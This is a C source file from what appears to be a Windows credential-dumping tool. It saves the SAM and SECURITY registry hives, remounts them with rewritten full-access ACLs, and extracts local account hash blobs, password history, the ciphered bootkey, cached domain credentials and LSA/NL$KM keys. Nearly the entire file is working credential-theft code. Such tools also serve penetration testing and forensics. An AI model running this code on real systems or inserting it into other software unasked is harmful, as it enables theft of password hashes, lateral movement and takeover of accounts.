#include "samparser.h"


/*
 * Apply recursively a security descriptor to all
 * subkeys of a given key
 */
int ApplySecurityDescriptorRecursively(HKEY hRootKey,LPSTR szKeyName,SECURITY_DESCRIPTOR *sec_desc) {
	TCHAR szSubkey[512];
	DWORD dwSubkey,ind=0;
	LSTATUS dwRtn;
	HKEY hKey;

	/* Apply security descriptor to current key */
	if(RegOpenKeyEx(hRootKey,szKeyName,0,WRITE_DAC,&hKey) != ERROR_SUCCESS)
		return SAM_REG_ERROR;
	if(RegSetKeySecurity(hKey,(SECURITY_INFORMATION)DACL_SECURITY_INFORMATION,sec_desc)!=ERROR_SUCCESS)
		return SAM_REG_ERROR;
	RegCloseKey(hKey);
	
	/* Loop through all keys & recurse */
	if(RegOpenKeyEx(hRootKey,szKeyName,0,KEY_ENUMERATE_SUB_KEYS,&hKey) != ERROR_SUCCESS)
		return SAM_REG_ERROR;

	do {
		dwSubkey = 512;
		lstrcpy(szSubkey,szKeyName);
		lstrcat(szSubkey,"\\");
		dwRtn = RegEnumKeyEx(hKey,ind++,szSubkey+lstrlen(szSubkey),&dwSubkey,NULL,NULL,NULL,NULL);
		if(dwRtn == ERROR_NO_MORE_ITEMS) {
			dwRtn = ERROR_SUCCESS;
			break;
		}
		else if(dwRtn == ERROR_SUCCESS)
			dwRtn = ApplySecurityDescriptorRecursively(hRootKey,szSubkey,sec_desc);
	}while(dwRtn == ERROR_SUCCESS);
     
	RegCloseKey(hKey);

	return dwRtn;
}


/*
 * Dump a full registry hive to disk (i.e SAM or SECURITY)
 */
BOOL SAM_SaveFromRegistry(LPSTR hiveName,LPSTR outFilename) {
	BOOL is_success = FALSE;
	DWORD dwDisposition=0;
	HKEY hKey;
	LONG ret;

	ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE,hiveName,0,NULL,REG_OPTION_BACKUP_RESTORE,0,NULL,&hKey,&dwDisposition);

	if(ret!=ERROR_SUCCESS) 
		return FALSE;
	else if(dwDisposition!=REG_OPENED_EXISTING_KEY) {
		RegCloseKey(hKey);
		return FALSE;
	}
	else{
		is_success = (RegSaveKeyEx(hKey,outFilename,NULL,REG_STANDARD_FORMAT)==ERROR_SUCCESS);
		RegCloseKey(hKey);
	}

	return is_success;
}


/*
 * Unload temporarily mounted registry hive
 * and delete registry hive file (+ .log file)
 */
void SAM_UnMount(LPSTR szTmpSAMPath) {
	TCHAR szLogFilename[MAX_PATH+23];

	RegUnLoadKey(HKEY_LOCAL_MACHINE,TEMP_SAM_KEY);
	DeleteFile(szTmpSAMPath);

	lstrcpyn(szLogFilename,szTmpSAMPath,MAX_PATH);
	lstrcat(szLogFilename,".LOG");
	DeleteFile(szLogFilename);
}


/*
 * Mount temporarily registry hive from disk
 * Adjust keys ACL recursivly for parsing
 */
int SAM_Mount(LPSTR inFilename) {
	SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;     
    PSID pAdministratorsSid = NULL;   
    SECURITY_DESCRIPTOR sd;
    PACL pDacl = NULL;   
    DWORD dwAclSize;    

	/* Mount hive on random key */
	if(RegLoadKey(HKEY_LOCAL_MACHINE,TEMP_SAM_KEY,inFilename) != ERROR_SUCCESS)
		return SAM_MOUNT_ERROR;

	/* Initialize an administrators group ACL */
    if(!AllocateAndInitializeSid(&sia,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&pAdministratorsSid))
		return SAM_REG_ERROR;
  
	dwAclSize = sizeof(ACL) + (sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD)) + GetLengthSid(pAdministratorsSid);
    if(!(pDacl = (PACL)HeapAlloc(GetProcessHeap(), 0, dwAclSize)))
		return SAM_MEM_ERROR;
   
    if(!InitializeAcl(pDacl, dwAclSize, ACL_REVISION)) {
		HeapFree(GetProcessHeap(),0,pDacl);
		return SAM_REG_ERROR;
	}
   
	/* Grant to SID a full access to registry keys */
    if(!AddAccessAllowedAceEx(pDacl,ACL_REVISION,CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE | INHERITED_ACE,KEY_ALL_ACCESS,pAdministratorsSid)) {
		HeapFree(GetProcessHeap(),0,pDacl);
		return SAM_REG_ERROR;
	}
   
	/* Build security descriptor from ACL */
    if(!InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION)) {
		HeapFree(GetProcessHeap(),0,pDacl);
		return SAM_REG_ERROR;
	}
   
    if(!SetSecurityDescriptorDacl(&sd,TRUE,pDacl,FALSE)) {
		HeapFree(GetProcessHeap(),0,pDacl);
		return SAM_REG_ERROR;
	}

	/* Apply it recursively to all key */
	ApplySecurityDescriptorRecursively(HKEY_LOCAL_MACHINE,TEMP_SAM_KEY,&sd);

	return SAM_SUCCESS;
}


/*
 * Get samAccountName from SAM hive for a given RID
 */
int SAM_GetUserNameFromRID(DWORD rid,LPSTR samAccountName) {
	TCHAR szUsernamesKeyPath[128],szSubkey[UNLEN+1],szUsernameKeyPath[UNLEN+1+128];
	DWORD ind=0,dwSubkey,dwRtn,dwValType;
	int retCode=SAM_REG_ERROR;
	HKEY hKey;

	lstrcpy(szUsernamesKeyPath,TEMP_SAM_KEY);
	lstrcat(szUsernamesKeyPath,"\\SAM\\Domains\\Account\\Users\\Names");

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szUsernamesKeyPath,0,KEY_ENUMERATE_SUB_KEYS,&hKey) != ERROR_SUCCESS)
		return SAM_REG_ERROR;

	do {
		dwSubkey = sizeof(szSubkey);
		dwRtn = RegEnumKeyEx(hKey,ind++,szSubkey,&dwSubkey,NULL,NULL,NULL,NULL);
		if(dwRtn==ERROR_SUCCESS) {
			lstrcpy(szUsernameKeyPath,szUsernamesKeyPath);
			lstrcat(szUsernameKeyPath,"\\");
			lstrcat(szUsernameKeyPath,szSubkey);
			if(!RegGetValueEx(HKEY_LOCAL_MACHINE,szUsernameKeyPath,"",&dwValType,NULL,NULL,NULL)) {
				retCode = SAM_REG_ERROR;
				break;
			}
			if(dwValType==rid) {
				lstrcpyn(samAccountName,szSubkey,UNLEN);
				retCode = SAM_SUCCESS;
			}
		}
		else if(dwRtn!=ERROR_NO_MORE_ITEMS)
			break;

	}while(dwRtn==ERROR_SUCCESS);

	RegCloseKey(hKey);

	return retCode;
}


/*
 * Enumerate all local SAM users & retrieve RID, V, samAccountName
 */
int SAM_ParseAllAccount(ll_localAccountInfo *localAccountInfo,BOOL with_history) {
	TCHAR szUsersKeyPath[128],szUserKeyPath[128],szSubkey[128];
	s_localAccountInfo localAccountEntry;
	DWORD ind=0,dwSubkey,dwRtn;
	int retCode = SAM_REG_ERROR;
	HKEY hKey;

	lstrcpy(szUsersKeyPath,TEMP_SAM_KEY);
	lstrcat(szUsersKeyPath,"\\SAM\\Domains\\Account\\Users");

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szUsersKeyPath,0,KEY_ENUMERATE_SUB_KEYS,&hKey) != ERROR_SUCCESS)
		return SAM_REG_ERROR;

	do {
		dwSubkey = sizeof(szSubkey);
		dwRtn = RegEnumKeyEx(hKey,ind++,szSubkey,&dwSubkey,NULL,NULL,NULL,NULL);
		if(dwRtn==ERROR_SUCCESS) {
			if(!lstrcmp(szSubkey,"Names"))
				continue;

			RtlZeroMemory(&localAccountEntry,sizeof(s_localAccountInfo));

			lstrcpy(szUserKeyPath,szUsersKeyPath);
			lstrcat(szUserKeyPath,"\\");
			lstrcat(szUserKeyPath,szSubkey);
			if(!RegGetValueEx(HKEY_LOCAL_MACHINE,szUserKeyPath,"V",NULL,NULL,0,&localAccountEntry.dwVSize)) {
				retCode = SAM_REG_ERROR;
				break;
			}

			/* Extract scrambled ciphered NT/LM struct */
			if(!(localAccountEntry.V = (LPBYTE)malloc(localAccountEntry.dwVSize))) {
				retCode = SAM_MEM_ERROR;
				break;
			}
			if(!RegGetValueEx(HKEY_LOCAL_MACHINE,szUserKeyPath,"V",NULL,localAccountEntry.V,localAccountEntry.dwVSize,NULL)) {
				retCode = SAM_REG_ERROR;
				break;
			}

			LPBYTE tmp = localAccountEntry.V;

			/* Check for history if asked */
			localAccountEntry.nbHistoryEntries = (((*(LPWORD)(tmp+0xC4))-4) / WIN_NTLM_HASH_SIZE) + 1;  /* +1 = FIX  for strange MS behavior (see crypt.cpp)*/
			if(with_history && (localAccountEntry.nbHistoryEntries!=0)) {
				localAccountEntry.NTLM_hash_history = (s_NTLM_Hash *)malloc(localAccountEntry.nbHistoryEntries*sizeof(s_NTLM_Hash));
			}

			/* Check main hash type (TO fix see crypt.cpp) */
			/*if((DWORD)((*(LPWORD)(tmp+0x9c)) + 0xCC + 2*WIN_NTLM_HASH_SIZE + 8) < (dwValSize-((*(LPWORD)(tmp+0xC4)-4)*2)))
				localAccountEntry.NTLM_hash.hash_type = LM_HASH;
			else if((DWORD)((*(LPWORD)(tmp+0x9c)) + 0xCC + WIN_NTLM_HASH_SIZE + 4) < (dwValSize-((*(LPWORD)(tmp+0xC4)-4)*2)))
				localAccountEntry.NTLM_hash.hash_type = NT_HASH;
			else
				localAccountEntry.NTLM_hash.hash_type = NT_NO_HASH;*/

			/* Extract RID */
			localAccountEntry.rid = strtoul(szSubkey,NULL,16);
			
			/* Extract username */
			if(SAM_GetUserNameFromRID(localAccountEntry.rid,localAccountEntry.szSAMAccountName)==SAM_SUCCESS) {
				if(!localAccountInfoNew(localAccountInfo,&localAccountEntry)) {
					puts("ERROR: fatal, not enough memory");
					retCode = SAM_MEM_ERROR;
					break;
				}
			}
			else{
				retCode = SAM_REG_ERROR;
				break;
			}
		}
		else if(dwRtn==ERROR_NO_MORE_ITEMS) {
			retCode = SAM_SUCCESS;
			break;
		}
		else {
			retCode = SAM_REG_ERROR;
		}

	}while(dwRtn==ERROR_SUCCESS);

	RegCloseKey(hKey);

	return retCode;
}


/*
 * Parse local SAM (account name, NT, LM) and retrieves ciphered bootkey
 * Method : registry save + seBackupPrivilege
 */
int SAM_ParseLocalDatabase(ll_localAccountInfo *localAccountInfo,s_BOOTKEY_ciphered *bootkey_ciphered,BOOL with_history) {
	TCHAR szTmpSAMPath[MAX_PATH+20],szCipheredBootkeyPath[128];
	int retCode = SAM_SUCCESS;
	DWORD len;

	/* Make temporary filename */
	len = GetTempPath(MAX_PATH,szTmpSAMPath);
	wsprintf(szTmpSAMPath+len,"\\SAM-%u.dmp",GetTickCount());

	/* Unload any previous instance of our hive */
	SAM_UnMount(szTmpSAMPath);

	/* Dump SAM registry hive to disk */
	if(!SAM_SaveFromRegistry("SAM",szTmpSAMPath))
		return SAM_REG_ERROR;

	/* Load saved dump and set new ACL (full access), next parse*/
	if((retCode=SAM_Mount(szTmpSAMPath))==SAM_SUCCESS) {
		retCode = SAM_ParseAllAccount(localAccountInfo,with_history);
		if(retCode != SAM_SUCCESS) {
			SAM_UnMount(szTmpSAMPath);
			return retCode;
		}
	}

	if(!(*localAccountInfo)) {
		retCode = SAM_NO_ACCOUNT;
	}
	else {
		/* Get ciphered boot key */
		lstrcpy(szCipheredBootkeyPath,TEMP_SAM_KEY);
		lstrcat(szCipheredBootkeyPath,"\\SAM\\Domains\\Account");
		retCode = RegGetValueEx(HKEY_LOCAL_MACHINE,szCipheredBootkeyPath,"F",NULL,bootkey_ciphered->F,sizeof(bootkey_ciphered->F),NULL) ? SAM_SUCCESS : SAM_REG_ERROR;
	}
	/* Delete temporay SAM file */
	SAM_UnMount(szTmpSAMPath);

	return retCode;
}



/*
 * Enumerate all cached domain accounts
 * By default : 10 entries as $NLi , i=1..10
 */
int SAM_ParseAllCachedAccount(ll_cachedAccountInfo *cachedAccountInfo) {
	TCHAR szCachedKeyPath[128],szValue[128];
	s_cachedAccountInfo cachedAccountEntry;
	DWORD dwSzValue,dwValSize,dwRtn;
	int retCode = SAM_REG_ERROR;
	HKEY hKey;
	int ind=0;

	lstrcpy(szCachedKeyPath,TEMP_SAM_KEY);
	lstrcat(szCachedKeyPath,"\\Cache");
	
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szCachedKeyPath,0,KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
		return SAM_REG_ERROR;

	do {
		dwSzValue = sizeof(szValue);
		dwRtn = RegEnumValue(hKey,ind++,szValue,&dwSzValue,NULL,NULL,NULL,NULL);
		if(dwRtn==ERROR_SUCCESS) {
			if(!lstrcmp(szValue,"NL$Control"))
				continue;
			
			RtlZeroMemory(&cachedAccountEntry,sizeof(s_cachedAccountInfo));

			if(!RegGetValueEx(HKEY_LOCAL_MACHINE,szCachedKeyPath,szValue,NULL,NULL,0,&dwValSize)) {
				retCode = SAM_REG_ERROR;
				break;
			}

			if(!(cachedAccountEntry.cachedEntry = (LPBYTE)malloc(dwValSize))) {
				retCode = SAM_MEM_ERROR;
				break;
			}
			if(!RegGetValueEx(HKEY_LOCAL_MACHINE,szCachedKeyPath,szValue,NULL,cachedAccountEntry.cachedEntry,dwValSize,NULL)) {
				retCode = SAM_REG_ERROR;
				break;
			}
			cachedAccountEntry.dwCachedEntrySize = dwValSize;
			if(!cachedAccountInfoNew(cachedAccountInfo,&cachedAccountEntry)) {
					puts("ERROR: fatal, not enough memory");
					retCode = SAM_MEM_ERROR;
					break;
			}
		}
		else if(dwRtn==ERROR_NO_MORE_ITEMS) {
			retCode = SAM_SUCCESS;
			break;
		}
		else {
			retCode = SAM_REG_ERROR;
		}

	}while(dwRtn==ERROR_SUCCESS);

	RegCloseKey(hKey);

	return retCode;
}


/*
 * Parse cached SAM (account name, NT, LM) => cached domain passwords
 * also retrieved LSA ciphered key
 * Method : registry save + seBackupPrivilege
 */
int SAM_ParseCachedDatabase(ll_cachedAccountInfo *cachedAccountInfo,s_LSAKEY_ciphered *lsakey_ciphered,s_NLKM_ciphered *nlkm_ciphered) {
	TCHAR szTmpSAMPath[MAX_PATH+20],szCipheredLsakeyPath[128];
	int retCode = SAM_SUCCESS;
	OSVERSIONINFO osv;
	DWORD len;

	/* Make temporary filename */
	len = GetTempPath(MAX_PATH,szTmpSAMPath);
	wsprintf(szTmpSAMPath+len,"\\SAM-%u.dmp",GetTickCount());

	/* Unload any previous instance of our hive */
	SAM_UnMount(szTmpSAMPath);

	/* Dump SAM registry hive to disk */
	if(!SAM_SaveFromRegistry("SECURITY",szTmpSAMPath))
		return SAM_REG_ERROR;

	/* Load saved dump and set new ACL (full access), next parse */
	if((retCode=SAM_Mount(szTmpSAMPath))==SAM_SUCCESS) {
		retCode = SAM_ParseAllCachedAccount(cachedAccountInfo);
		if(retCode != SAM_SUCCESS) {
			SAM_UnMount(szTmpSAMPath);
			return retCode;
		}
	}

	/* Get LSA key (since Vista, not only one key is possible) & NLKM key */
	RtlZeroMemory(&osv,sizeof(OSVERSIONINFO));
	osv.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osv);
	/* Vista, 7 & 2008 case */
	if(osv.dwMajorVersion >= 6) {
		lstrcpy(szCipheredLsakeyPath,TEMP_SAM_KEY);
		lstrcat(szCipheredLsakeyPath,"\\Policy\\PolEKList");
		retCode = RegGetValueEx(HKEY_LOCAL_MACHINE,szCipheredLsakeyPath,"",NULL,lsakey_ciphered->PolEKList,sizeof(lsakey_ciphered->PolEKList),NULL) ? SAM_SUCCESS : SAM_REG_ERROR;

		lstrcpy(szCipheredLsakeyPath,TEMP_SAM_KEY);
		lstrcat(szCipheredLsakeyPath,"\\Policy\\Secrets\\NL$KM\\CurrVal");
		retCode = RegGetValueEx(HKEY_LOCAL_MACHINE,szCipheredLsakeyPath,"",NULL,nlkm_ciphered->key_v2,sizeof(nlkm_ciphered->key_v2),NULL) ? SAM_SUCCESS : SAM_REG_ERROR;
	}
	/* Should be 2003 or XP => key is unique */
	else {
		lstrcpy(szCipheredLsakeyPath,TEMP_SAM_KEY);
		lstrcat(szCipheredLsakeyPath,"\\Policy\\PolSecretEncryptionKey");
		retCode = RegGetValueEx(HKEY_LOCAL_MACHINE,szCipheredLsakeyPath,"",NULL,lsakey_ciphered->PolSecretEncryptionKey,sizeof(lsakey_ciphered->PolSecretEncryptionKey),NULL) ? SAM_SUCCESS : SAM_REG_ERROR;

		lstrcpy(szCipheredLsakeyPath,TEMP_SAM_KEY);
		lstrcat(szCipheredLsakeyPath,"\\Policy\\Secrets\\NL$KM\\CurrVal");
		retCode = RegGetValueEx(HKEY_LOCAL_MACHINE,szCipheredLsakeyPath,"",NULL,nlkm_ciphered->key,sizeof(nlkm_ciphered->key),NULL) ? SAM_SUCCESS : SAM_REG_ERROR;
	}

	lsakey_ciphered->dwMajorVersion = osv.dwMajorVersion;
	nlkm_ciphered->dwMajorVersion = osv.dwMajorVersion;

	/* Delete temporay SAM file */
	SAM_UnMount(szTmpSAMPath);

	return retCode;
}
